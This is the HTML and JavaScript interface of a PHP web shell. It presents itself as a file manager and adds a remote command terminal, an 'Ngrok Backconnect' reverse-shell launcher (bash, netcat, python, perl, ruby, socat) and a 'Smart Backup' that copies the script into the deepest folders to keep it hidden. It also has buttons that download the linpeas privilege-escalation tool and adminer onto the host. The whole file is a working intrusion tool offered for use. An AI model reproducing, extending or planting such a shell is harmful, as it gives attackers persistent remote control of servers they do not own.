</div>

<?php if ($msg): ?>
<script>
Swal.fire({icon:'success',title:'Success!',text:'<?php echo addslashes($msg); ?>',timer:2000,showConfirmButton:false,background:'#1e293b',color:'#e2e8f0'});
</script>
<?php endif; ?>

<div class="glass rounded-xl p-6">
<div class="flex justify-between items-center mb-4">
<h2 class="text-xl font-bold text-white">
<i class="fas fa-list mr-2 text-green-400"></i>Files & Folders
</h2>
<button id="bulkDeleteBtn" onclick="bulkDelete()" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg hover-scale hidden">
<i class="fas fa-trash-alt mr-2"></i>Delete Selected (<span id="selectedCount">0</span>)
</button>
</div>
<div class="overflow-x-auto">
<table class="w-full">
<thead>
<tr class="border-b border-gray-700">
<th class="text-left p-3 text-gray-300 w-10">
<input type="checkbox" id="selectAll" onchange="toggleSelectAll()" class="form-checkbox h-4 w-4 text-blue-600 rounded">
</th>
<th class="text-left p-3 text-gray-300">Name</th>
<th class="text-left p-3 text-gray-300">Size</th>
<th class="text-left p-3 text-gray-300">Permissions</th>
<th class="text-left p-3 text-gray-300">Modified</th>
<th class="text-left p-3 text-gray-300">Actions</th>
</tr>
</thead>
<tbody>
<?php if ($path !== '/'): ?>
<tr class="border-b border-gray-800 hover:bg-gray-800">
<td class="p-3"></td>
<td class="p-3" colspan="5">
<a href="?l=&p=<?php echo urlencode(dirname($path)); ?>" class="text-blue-400 hover:text-blue-300">
<i class="fas fa-level-up-alt mr-2"></i>.. (Parent Directory)
</a>
</td>
</tr>
<?php endif; ?>

<?php foreach ($items['dirs'] as $dir): ?>
<tr class="border-b border-gray-800 hover:bg-gray-800">
<td class="p-3">
<input type="checkbox" class="item-checkbox form-checkbox h-4 w-4 text-blue-600 rounded" 
       data-path="<?php echo htmlspecialchars($dir['path']); ?>" 
       data-type="dir" 
       onchange="updateSelectedCount()">
</td>
<td class="p-3">
<a href="?l=&p=<?php echo urlencode($dir['path']); ?>" class="text-yellow-400 hover:text-yellow-300">
<i class="fas fa-folder mr-2"></i><?php echo h($dir['name']); ?>
</a>
</td>
<td class="p-3 text-gray-500">-</td>
<td class="p-3 text-gray-400"><?php echo $dir['perms']; ?></td>
<td class="p-3 text-gray-400"><?php echo date('Y-m-d H:i', $dir['modified']); ?></td>
<td class="p-3">
<button onclick="rename('<?php echo addslashes($dir['path']); ?>','<?php echo addslashes($dir['name']); ?>')" class="text-blue-400 hover:text-blue-300 mr-3">
<i class="fas fa-edit"></i>
</button>
<button onclick="deleteItem('<?php echo addslashes($dir['path']); ?>')" class="text-red-400 hover:text-red-300">
<i class="fas fa-trash"></i>
</button>
</td>
</tr>
<?php endforeach; ?>

<?php foreach ($items['files'] as $file): ?>
<tr class="border-b border-gray-800 hover:bg-gray-800">
<td class="p-3">
<input type="checkbox" class="item-checkbox form-checkbox h-4 w-4 text-blue-600 rounded" 
       data-path="<?php echo htmlspecialchars($file['path']); ?>" 
       data-type="file" 
       onchange="updateSelectedCount()">
</td>
<td class="p-3">
<a href="#" onclick="editFile('<?php echo addslashes($file['path']); ?>');return false;" class="text-green-400 hover:text-green-300">
<i class="fas fa-file mr-2"></i><?php echo h($file['name']); ?>
</a>
</td>
<td class="p-3 text-gray-400"><?php echo formatSize($file['size']); ?></td>
<td class="p-3 text-gray-400"><?php echo $file['perms']; ?></td>
<td class="p-3 text-gray-400"><?php echo date('Y-m-d H:i', $file['modified']); ?></td>
<td class="p-3">
<button onclick="editFile('<?php echo addslashes($file['path']); ?>')" class="text-green-400 hover:text-green-300 mr-3">
<i class="fas fa-edit"></i>
</button>
<button onclick="rename('<?php echo addslashes($file['path']); ?>','<?php echo addslashes($file['name']); ?>')" class="text-blue-400 hover:text-blue-300 mr-3">
<i class="fas fa-signature"></i>
</button>
<button onclick="deleteItem('<?php echo addslashes($file['path']); ?>')" class="text-red-400 hover:text-red-300">
<i class="fas fa-trash"></i>
</button>
</td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
</div>
</div>

</div>

<!-- Modals -->
<div id="mUpload" class="modal">
<div class="glass rounded-xl p-6 w-full max-w-md mx-auto border border-gray-700">
<div class="flex justify-between items-center mb-4">
<h3 class="text-xl font-bold text-white"><i class="fas fa-upload mr-2 text-blue-400"></i>Upload File</h3>
<button onclick="hide('mUpload')" class="text-2xl text-gray-400 hover:text-white">&times;</button>
</div>
<form method="POST" enctype="multipart/form-data">
<input type="hidden" name="dir" value="<?php echo h($path); ?>">
<input type="file" name="file" required class="w-full mb-4 p-2 rounded">
<button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded-lg text-white">
<i class="fas fa-upload mr-2"></i>Upload
</button>
</form>
</div>
</div>

<div id="mNewFile" class="modal">
<div class="glass rounded-xl p-6 w-full max-w-md mx-auto border border-gray-700">
<div class="flex justify-between items-center mb-4">
<h3 class="text-xl font-bold text-white"><i class="fas fa-file-circle-plus mr-2 text-green-400"></i>New File</h3>
<button onclick="hide('mNewFile')" class="text-2xl text-gray-400 hover:text-white">&times;</button>
</div>
<form method="POST">
<input type="hidden" name="dir" value="<?php echo h($path); ?>">
<input type="text" name="fname" placeholder="File name" required class="w-full mb-3 p-2 rounded">
<textarea name="fcontent" rows="6" placeholder="Content (optional)" class="w-full mb-3 p-2 rounded"></textarea>
<button type="submit" name="newfile" value="1" class="w-full bg-green-600 hover:bg-green-700 py-2 rounded-lg text-white">
<i class="fas fa-plus mr-2"></i>Create
</button>
</form>
</div>
</div>

<div id="mNewFolder" class="modal">
<div class="glass rounded-xl p-6 w-full max-w-md mx-auto border border-gray-700">
<div class="flex justify-between items-center mb-4">
<h3 class="text-xl font-bold text-white"><i class="fas fa-folder-plus mr-2 text-purple-400"></i>New Folder</h3>
<button onclick="hide('mNewFolder')" class="text-2xl text-gray-400 hover:text-white">&times;</button>
</div>
<form method="POST">
<input type="hidden" name="dir" value="<?php echo h($path); ?>">
<input type="text" name="dname" placeholder="Folder name" required class="w-full mb-3 p-2 rounded">
<button type="submit" name="newfolder" value="1" class="w-full bg-purple-600 hover:bg-purple-700 py-2 rounded-lg text-white">
<i class="fas fa-plus mr-2"></i>Create
</button>
</form>
</div>
</div>

<div id="mTerminal" class="modal">
<div class="glass rounded-xl p-6 w-full max-w-4xl mx-auto border border-gray-700">
<div class="flex justify-between items-center mb-4">
<h3 class="text-xl font-bold text-white"><i class="fas fa-terminal mr-2 text-yellow-400"></i>Terminal</h3>
<div class="space-x-2">
<button onclick="clearTerm()" class="bg-yellow-600 hover:bg-yellow-700 px-3 py-1 rounded text-white">
<i class="fas fa-eraser mr-2"></i>Clear
</button>
<button onclick="hide('mTerminal')" class="text-2xl text-gray-400 hover:text-white">&times;</button>
</div>
</div>
<div id="output" class="bg-black rounded-lg p-4 h-96 overflow-y-auto mb-4 font-mono text-sm text-green-400"></div>
<form onsubmit="runCmd(event)" class="flex gap-2">
<input type="text" id="cmd" placeholder="Enter command..." autocomplete="off" class="flex-1 p-2 rounded">
<button type="submit" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded text-white">
<i class="fas fa-play mr-2"></i>Run
</button>
</form>
</div>
</div>

<div id="mEdit" class="modal">
<div class="glass rounded-xl p-6 w-full max-w-4xl mx-auto border border-gray-700">
<div class="flex justify-between items-center mb-4">
<h3 class="text-xl font-bold text-white"><i class="fas fa-edit mr-2 text-green-400"></i>Edit File</h3>
<button onclick="hide('mEdit')" class="text-2xl text-gray-400 hover:text-white">&times;</button>
</div>
<form method="POST">
<input type="hidden" name="path" id="editPath">
<textarea name="content" id="editContent" rows="20" class="w-full mb-3 p-3 rounded font-mono text-sm"></textarea>
<button type="submit" name="save" value="1" class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded-lg text-white">
<i class="fas fa-save mr-2"></i>Save
</button>
</form>
</div>
</div>

<div id="mNgrok" class="modal">
<div class="glass rounded-xl p-6 w-full max-w-lg mx-auto border border-gray-700">
<div class="flex justify-between items-center mb-4">
<h3 class="text-xl font-bold text-white"><i class="fas fa-link mr-2 text-orange-400"></i>Ngrok Backconnect</h3>
<button onclick="hide('mNgrok')" class="text-2xl text-gray-400 hover:text-white">&times;</button>
</div>
<form onsubmit="ngrokConnect(event)">
<div class="mb-4">
<label class="block mb-2 text-gray-300">Type</label>
<select name="type" required class="w-full p-2 rounded">
<option value="bash">Bash</option>
<option value="nc">Netcat</option>
<option value="python">Python</option>
<option value="php">PHP</option>
<option value="perl">Perl</option>
<option value="ruby">Ruby</option>
<option value="socat">Socat</option>
</select>
</div>
<div class="mb-4">
<label class="block mb-2 text-gray-300">Ngrok URL</label>
<input type="text" name="url" placeholder="0.tcp.ngrok.io:12345" required class="w-full p-2 rounded">
</div>
<button type="submit" class="w-full bg-orange-600 hover:bg-orange-700 py-2 rounded-lg text-white">
<i class="fas fa-link mr-2"></i>Connect
</button>
</form>
</div>
</div>

<div id="mBackup" class="modal">
<div class="glass rounded-xl p-6 w-full max-w-lg mx-auto border border-gray-700">
<div class="flex justify-between items-center mb-4">
<h3 class="text-xl font-bold text-white"><i class="fas fa-save mr-2 text-cyan-400"></i>Smart Backup</h3>
<button onclick="hide('mBackup')" class="text-2xl text-gray-400 hover:text-white">&times;</button>
</div>
<form onsubmit="smartBackup(event)">
<div class="mb-4">
<label class="block mb-2 text-gray-300">Start Directory</label>
<input type="text" name="dir" value="<?php echo h($path); ?>" required class="w-full p-2 rounded">
</div>
<div class="mb-4">
<label class="block mb-2 text-gray-300">Number of Copies (max 100)</label>
<input type="number" name="num_copies" value="5" min="1" max="100" required class="w-full p-2 rounded">
<p class="text-xs text-gray-500 mt-1">Script will be copied to the first N deepest folders</p>
</div>
<button type="submit" class="w-full bg-cyan-600 hover:bg-cyan-700 py-2 rounded-lg text-white">
<i class="fas fa-save mr-2"></i>Create Backup
</button>
</form>
</div>
</div>

<div id="mTools" class="modal">
<div class="glass rounded-xl p-6 w-full max-w-md mx-auto border border-gray-700">
<div class="flex justify-between items-center mb-4">
<h3 class="text-xl font-bold text-white"><i class="fas fa-download mr-2 text-indigo-400"></i>Download Tools</h3>
<button onclick="hide('mTools')" class="text-2xl text-gray-400 hover:text-white">&times;</button>
</div>
<div class="space-y-3">
<form method="POST">
<input type="hidden" name="dir" value="<?php echo h($path); ?>">
<button type="submit" name="dl_linpeas" value="1" class="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-left px-4 text-white">
<i class="fas fa-download mr-2"></i>Download Linpeas
<p class="text-xs text-gray-300 mt-1">Linux privilege escalation tool</p>
</button>
</form>
<form method="POST">
<input type="hidden" name="dir" value="<?php echo h($path); ?>">
<button type="submit" name="dl_adminer" value="1" class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-left px-4 text-white">
<i class="fas fa-database mr-2"></i>Download Adminer
<p class="text-xs text-gray-300 mt-1">Database management tool</p>
</button>
</form>
</div>
</div>
</div>

<script>
var currentDir='<?php echo addslashes($path); ?>';
function show(id){document.getElementById(id).classList.add('active')}
function hide(id){document.getElementById(id).classList.remove('active')}

function deleteItem(path){
Swal.fire({
title:'Delete this item?',
text:"This action cannot be undone!",
icon:'warning',
showCancelButton:true,
confirmButtonColor:'#dc2626',
cancelButtonColor:'#4b5563',
confirmButtonText:'<i class="fas fa-trash mr-2"></i>Yes, delete it!',
background:'#1e293b',
color:'#e2e8f0'
}).then(function(result){
if(result.isConfirmed){
var f=document.createElement('form');
f.method='POST';
f.innerHTML='<input type="hidden" name="delete" value="1"><input type="hidden" name="path" value="'+path+'">';
document.body.appendChild(f);
f.submit();
}
});
}

function rename(path,oldName){
Swal.fire({
title:'Rename',
input:'text',
inputValue:oldName,
showCancelButton:true,
confirmButtonColor:'#2563eb',
cancelButtonColor:'#4b5563',
confirmButtonText:'<i class="fas fa-check mr-2"></i>Rename',
background:'#1e293b',
color:'#e2e8f0',
inputValidator:function(value){
if(!value)return 'Please enter a name!';
}
}).then(function(result){
if(result.isConfirmed){
var f=document.createElement('form');
f.method='POST';
f.innerHTML='<input type="hidden" name="rename" value="1"><input type="hidden" name="old" value="'+path+'"><input type="hidden" name="new" value="'+result.value+'">';
document.body.appendChild(f);
f.submit();
}
});
}

function editFile(path){
var f=new FormData();
f.append('ajax','1');
f.append('read',path);
fetch('',{method:'POST',body:f})
.then(function(r){return r.text()})
.then(function(content){
document.getElementById('editPath').value=path;
document.getElementById('editContent').value=content;
show('mEdit');
})
.catch(function(){
Swal.fire({icon:'error',title:'Error',text:'Failed to load file',confirmButtonColor:'#dc2626',background:'#1e293b',color:'#e2e8f0'});
});
}

var termCwd=currentDir;
function runCmd(e){
e.preventDefault();
var input=document.getElementById('cmd');
var output=document.getElementById('output');
var cmd=input.value.trim();
if(!cmd)return;
output.innerHTML+='<div class="text-cyan-400">'+termCwd+' $</div>';
output.innerHTML+='<div class="text-white">'+cmd+'</div>';
var f=new FormData();
f.append('ajax','1');
f.append('cmd',cmd);
fetch('',{method:'POST',body:f})
.then(function(r){return r.json()})
.then(function(data){
if(data.output){
output.innerHTML+='<div class="text-green-400">'+data.output.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>')+'</div>';
}
if(data.cwd)termCwd=data.cwd;
output.scrollTop=output.scrollHeight;
})
.catch(function(){
output.innerHTML+='<div class="text-red-400">Command failed</div>';
});
input.value='';
}
function clearTerm(){document.getElementById('output').innerHTML=''}

function ngrokConnect(e){
e.preventDefault();
var form=e.target;
var f=new FormData(form);
f.append('ajax','1');
f.append('ngrok','1');

Swal.fire({
title:'Connecting...',
showConfirmButton:false,
allowOutsideClick:false,
background:'#1e293b',
color:'#e2e8f0',
didOpen:function(){Swal.showLoading()}
});

fetch('',{method:'POST',body:f})
.then(function(r){return r.json()})
.then(function(d){
if(d.ok){
Swal.fire({
icon:'success',
title:'Connected!',
text:d.msg,
confirmButtonColor:'#059669',
background:'#1e293b',
color:'#e2e8f0'
}).then(function(){hide('mNgrok')});
}else{
Swal.fire({icon:'error',title:'Error',text:d.msg,confirmButtonColor:'#dc2626',background:'#1e293b',color:'#e2e8f0'});
}
})
.catch(function(){
Swal.fire({icon:'error',title:'Error',text:'Request failed',confirmButtonColor:'#dc2626',background:'#1e293b',color:'#e2e8f0'});
});
}

function smartBackup(e){
e.preventDefault();
var form=e.target;
var f=new FormData(form);
f.append('ajax','1');
f.append('smartbackup','1');

Swal.fire({
title:'Creating Backup...',
text:'Please wait',
showConfirmButton:false,
allowOutsideClick:false,
background:'#1e293b',
color:'#e2e8f0',
didOpen:function(){Swal.showLoading()}
});

fetch('',{method:'POST',body:f})
.then(function(r){return r.json()})
.then(function(d){
if(d.ok){
var html='<div class="text-sm mb-2">Copied to '+d.total_copied+' of '+d.total_deepest+' deepest folders</div>';
if(d.locations && d.locations.length>0){
html+='<div class="max-h-60 overflow-y-auto bg-gray-900 p-3 rounded text-left"><div class="text-xs space-y-1">';
d.locations.forEach(function(loc){
var path = typeof loc === 'object' ? loc.path : loc;
var base = typeof loc === 'object' ? ' ('+loc.base+'_v'+loc.version+')' : '';
html+='<div class="text-green-400">✓ '+path+base+'</div>';
});
html+='</div></div>';
}
Swal.fire({
icon:'success',
title:'Backup Complete!',
html:html,
width:'600px',
confirmButtonColor:'#0891b2',
background:'#1e293b',
color:'#e2e8f0'
}).then(function(){hide('mBackup')});
}else{
Swal.fire({icon:'error',title:'Error',text:d.msg||'Backup failed',confirmButtonColor:'#dc2626',background:'#1e293b',color:'#e2e8f0'});
}
})
.catch(function(){
Swal.fire({icon:'error',title:'Error',text:'Request failed',confirmButtonColor:'#dc2626',background:'#1e293b',color:'#e2e8f0'});
});
}

// Bulk Delete Functions
function toggleSelectAll() {
    var selectAll = document.getElementById('selectAll');
    var checkboxes = document.querySelectorAll('.item-checkbox');
    checkboxes.forEach(function(cb) {
        cb.checked = selectAll.checked;
    });
    updateSelectedCount();
}

function updateSelectedCount() {
    var checkboxes = document.querySelectorAll('.item-checkbox:checked');
    var count = checkboxes.length;
    document.getElementById('selectedCount').textContent = count;
    
    var bulkBtn = document.getElementById('bulkDeleteBtn');
    if (count > 0) {
        bulkBtn.classList.remove('hidden');
    } else {
        bulkBtn.classList.add('hidden');
    }
    
    // Update select all checkbox state
    var allCheckboxes = document.querySelectorAll('.item-checkbox');
    var selectAll = document.getElementById('selectAll');
    if (count === 0) {
        selectAll.checked = false;
        selectAll.indeterminate = false;
    } else if (count === allCheckboxes.length) {
        selectAll.checked = true;
        selectAll.indeterminate = false;
    } else {
        selectAll.checked = false;
        selectAll.indeterminate = true;
    }
}

function bulkDelete() {
    var checkboxes = document.querySelectorAll('.item-checkbox:checked');
    if (checkboxes.length === 0) {
        Swal.fire({
            icon: 'warning',
            title: 'No Selection',
            text: 'Please select items to delete',
            confirmButtonColor: '#dc2626',
            background: '#1e293b',
            color: '#e2e8f0'
        });
        return;
    }
    
    var items = [];
    checkboxes.forEach(function(cb) {
        items.push({
            path: cb.getAttribute('data-path'),
            type: cb.getAttribute('data-type')
        });
    });
    
    Swal.fire({
        title: 'Confirm Bulk Delete',
        html: 'Delete ' + items.length + ' selected item(s)?<br><span class="text-red-400">This cannot be undone!</span>',
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#dc2626',
        cancelButtonColor: '#6b7280',
        confirmButtonText: 'Yes, delete!',
        cancelButtonText: 'Cancel',
        background: '#1e293b',
        color: '#e2e8f0'
    }).then(function(result) {
        if (result.isConfirmed) {
            performBulkDelete(items);
        }
    });
}

function performBulkDelete(items) {
    var deleted = 0;
    var failed = 0;
    var total = items.length;
    
    Swal.fire({
        title: 'Deleting...',
        html: 'Progress: <b>0</b> / ' + total,
        allowOutsideClick: false,
        background: '#1e293b',
        color: '#e2e8f0',
        didOpen: function() {
            Swal.showLoading();
        }
    });
    
    function deleteNext(index) {
        if (index >= items.length) {
            // All done
            Swal.fire({
                icon: 'success',
                title: 'Bulk Delete Complete',
                html: '<b>' + deleted + '</b> deleted<br><b>' + failed + '</b> failed',
                confirmButtonColor: '#0891b2',
                background: '#1e293b',
                color: '#e2e8f0'
            }).then(function() {
                location.reload();
            });
            return;
        }
        
        var item = items[index];
        var formData = new FormData();
        formData.append('delete', '1');
        formData.append('path', item.path);
        
        fetch('?l=&p=<?php echo urlencode($path); ?>', {
            method: 'POST',
            body: formData
        })
        .then(function(response) {
            return response.text();
        })
        .then(function() {
            deleted++;
        })
        .catch(function() {
            failed++;
        })
        .finally(function() {
            Swal.update({
                html: 'Progress: <b>' + (index + 1) + '</b> / ' + total
            });
            deleteNext(index + 1);
        });
    }
    
    deleteNext(0);
}
</script>

</body>
</html>
